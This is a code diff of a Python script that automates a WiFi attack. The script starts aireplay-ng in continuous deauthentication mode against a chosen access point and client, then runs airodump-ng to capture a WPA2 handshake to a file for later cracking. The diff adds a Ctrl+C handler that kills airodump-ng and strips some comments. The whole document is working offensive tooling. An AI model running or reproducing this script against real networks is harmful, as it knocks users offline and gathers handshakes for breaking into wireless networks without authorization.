@@ -1,8 +1,20 @@
 import subprocess, signal, sys, time, os, shutil, csv, glob
 
+def kill_airodump():
+    try:
+        # Killing all airodump-ng processes
+        subprocess.run(['sudo', 'pkill', '-f', 'airodump-ng'], check=True)
+        print("All airodump-ng processes have been terminated.")
+    except subprocess.CalledProcessError as e:
+        print("Failed to terminate airodump-ng processes:", e)
+
+def signal_handler(sig, frame):
+    print('\nCtrl+C detected, stopping...')
+    kill_airodump()
+    sys.exit(0)
+
 def deauth(ap_mac, c_mac, interface):
     try:
-        # Running the deauth command in the background
         subprocess.Popen(['sudo', 'aireplay-ng', '-0', '0', '-a', ap_mac, '-c', c_mac, interface],
                          stdout=subprocess.DEVNULL,
                          stderr=subprocess.STDOUT)
@@ -11,8 +23,6 @@ def deauth(ap_mac, c_mac, interface):
 
 def dump(ap_mac, channel):
     try:
-        # Executing the dump command without redirecting stdout and stderr
-        # This allows the output to be displayed in the console
         subprocess.run(['sudo', 'airodump-ng', 'wlan0mon', '--bssid', ap_mac, '-c', str(channel), '-w', '/mnt/data/wpa2_handshake'])
     except Exception as e:
         print(f"Failed to execute dump command: {e}")
@@ -197,12 +207,11 @@ def main(essid, ap_mac, your_mac, c_mac):
     channel = "6"
     interface = "wlan0mon"
 
+    # Registering the Ctrl+C signal handler
+    signal.signal(signal.SIGINT, signal_handler)
+
     try:
         deauth(ap_mac, c_mac, interface)
-
         dump(ap_mac, channel)
-        
-    except KeyboardInterrupt:
-        print("\nExecution stopped by the user.")
     except Exception as e:
         print(f"An error occurred: {e}")
